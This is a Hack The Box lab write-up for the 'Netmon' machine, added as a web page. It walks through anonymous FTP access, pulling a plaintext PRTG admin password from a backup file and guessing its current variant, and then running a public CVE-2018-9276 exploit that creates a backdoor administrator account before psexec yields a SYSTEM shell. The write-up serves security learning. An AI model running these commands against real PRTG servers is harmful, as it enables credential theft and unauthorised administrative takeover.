@@ -1,0 +1,247 @@
+---
+layout: default
+title: Netmon
+---
+
+<h1>Netmon</h1>
+<p class="date">29/06/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/netmon/netmon.png">
+
+<p>Netmon is one of the easiest boxes in HTB. Getting user it's pretty straightforward, we just have to access to the <code>ftp</code> server. To get root, we'll need to dig into the file system to find some credentials and then use a public exploit to get RCE in the system as an administrator.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run a <code>nmap</code> to list ports open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/netmon# nmap -sC -sV 10.10.10.152 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 08:03 UTC
+Nmap scan report for 10.10.10.152
+Host is up (0.18s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR>          inetpub
+| 07-16-16  08:18AM       &lt;DIR>          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR>          Program Files
+| 02-02-19  11:28PM       &lt;DIR>          Program Files (x86)
+| 02-03-19  07:08AM       &lt;DIR>          Users
+|_02-25-19  10:49PM       &lt;DIR>          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-03-04 08:03:51
+|_  start_date: 2019-03-04 08:01:46
+</pre>
+
+<p>In port <code>21</code> we have an <code>ftp</code> server, so let's try to login anonymously.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/netmon# ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp>
+</pre>
+
+<p>Anonymous login is allowed, we get access to almost all the files in the system and we're able to download the user flag located in the <code>Public</code> folder.</p>
+
+<pre class="prettyprint">
+ftp> dir
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+02-02-19  11:18PM                 1024 .rnd
+02-25-19  09:15PM       &lt;DIR>          inetpub
+07-16-16  08:18AM       &lt;DIR>          PerfLogs
+02-25-19  09:56PM       &lt;DIR>          Program Files
+02-02-19  11:28PM       &lt;DIR>          Program Files (x86)
+02-03-19  07:08AM       &lt;DIR>          Users
+02-25-19  10:49PM       &lt;DIR>          Windows
+226 Transfer complete.
+
+ftp> cd Users
+250 CWD command successful.
+
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-25-19  10:44PM       &lt;DIR>          Administrator
+02-02-19  11:35PM       &lt;DIR>          Public
+226 Transfer complete.
+
+ftp> cd Public
+250 CWD command successful.
+
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  07:05AM       &lt;DIR>          Documents
+07-16-16  08:18AM       &lt;DIR>          Downloads
+07-16-16  08:18AM       &lt;DIR>          Music
+07-16-16  08:18AM       &lt;DIR>          Pictures
+02-02-19  11:35PM                   33 user.txt
+07-16-16  08:18AM       &lt;DIR>          Videos
+226 Transfer complete.
+
+ftp> get user.txt
+</pre>
+
+<p>Once downloaded we can read it in our system.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/netmon# cat user.txt 
+<span flag="dd58ce67b49e15105e88096c8d9255a5">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Checking what we have in the other ports we can see an <code>http</code> server server running on port <code>80</code> with a <code>PRTG Network Monitor</code>.</p> 
+
+<img class="img-fluid" src="/static/img/htb/netmon/1.png">
+
+<p>We don't have the credentials to access, but if we dig into the file system we'll find the following configuration and backup files in <code>/Users/All Users/Paessler/PRTG Network Monitor</code>.</p>
+
+<pre class="prettyprint">
+ftp> pwd
+257 "/Users/All Users/Paessler/PRTG Network Monitor" is current directory.
+
+ftp> ls -la
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  12:40AM       &lt;DIR>          Configuration Auto-Backups
+03-14-19  05:24AM       &lt;DIR>          Log Database
+02-03-19  12:18AM       &lt;DIR>          Logs (Debug)
+02-03-19  12:18AM       &lt;DIR>          Logs (Sensors)
+02-03-19  12:18AM       &lt;DIR>          Logs (System)
+03-14-19  05:24AM       &lt;DIR>          Logs (Web Server)
+03-14-19  05:29AM       &lt;DIR>          Monitoring Database
+03-14-19  05:53AM              1296583 PRTG Configuration.dat
+02-25-19  10:54PM              1189697 PRTG Configuration.old
+07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
+03-14-19  05:25AM              1647314 PRTG Graph Data Cache.dat
+02-25-19  11:00PM       &lt;DIR>          Report PDFs
+02-03-19  12:18AM       &lt;DIR>          System Information Database
+02-03-19  12:40AM       &lt;DIR>          Ticket Database
+02-03-19  12:18AM       &lt;DIR>          ToDo Database
+226 Transfer complete.
+
+ftp> get "PRTG Configuration.old.bak"
+</pre>
+
+<p>Checking its contents we see something interesting in <code>PRTG Configuration.old.bak</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/netmon# less 'PRTG Configuration.old.bak'
+...
+&lt;dbpassword>
+  &lt;!-- User: prtgadmin -->
+  PrTg@dmin2018
+&lt;/dbpassword>
+...
+</pre>
+
+<p>If we try to login with those credentials we'll notice they don't work, that's because the file we retrieved them from was a backup, so they've probably changed.</p>
+
+<p>We just have to replace the year <code>2018</code> with <code>2019</code>, ending up with <code>prtgadmin / PrTg@dmin2019</code> which should work and allow us to access the dashboard.</p>
+
+<img class="img-fluid" src="/static/img/htb/netmon/2.png">
+
+<p>We have an exploit available in <code>exploit-db</code> for this software: <a href="https://www.exploit-db.com/exploits/46527" target="_blank">PRTG Network Monitor 18.2.38 - Authenticated Remote Code Execution</a>.</p>
+
+<p>This script will create a malicious <code>ps1</code> file and then use it to execute commands in the system, the default ones are creating an user and adding it to the administrators group.</p>
+
+<p>To be able to run it we have to login in the website, get the cookie used by <code>PRTG</code> and pass it as an argument.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/netmon# ./prtg-exploit.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0JFQjIxNjM1LUYwOTEtNDQ1NC1BNEYwLTBFREIwNzUwRkY3MX0%3D"
+
+[+]#########################################################################[+] 
+[*] Authenticated PRTG network Monitor remote code execution                [*] 
+[+]#########################################################################[+] 
+[*] Date: 11/03/2019                                                        [*] 
+[+]#########################################################################[+] 
+[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
+[+]#########################################################################[+] 
+[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
+[*] Version: 18.2.38                                                        [*] 
+[*] CVE: CVE-2018-9276                                                      [*] 
+[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
+[+]#########################################################################[+] 
+
+# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 
+
+[+]#########################################################################[+] 
+
+ [*] file created 
+ [*] sending notification wait....
+
+ [*] adding a new user 'pentest' with password 'P3nT3st' 
+ [*] sending notification wait....
+
+ [*] adding a user pentest to the administrators group 
+ [*] sending notification wait....
+
+
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
+</pre>
+
+<p>The exploit should have created an administrator user for us (<code>pentest/P3nT3st!</code>), so now we can use <code>psexec</code> to get a shell.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/netmon# /opt/impacket/examples/psexec.py pentest@10.10.10.152
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+Password: P3nT3st!
+[*] Requesting shares on 10.10.10.152.....
+[*] Found writable share ADMIN$
+[*] Uploading file NSSEOeLR.exe
+[*] Opening SVCManager on 10.10.10.152.....
+[*] Creating service tgQH on 10.10.10.152.....
+[*] Starting service tgQH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+</pre>
+
+<p>The root flag is in the Administrator desktop.</p>
+
+<pre class="prettyprint">
+C:\Users\Administrator\Desktop>type root.txt
+<span flag="3018977fb944bf1878f75b879fba67cc">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
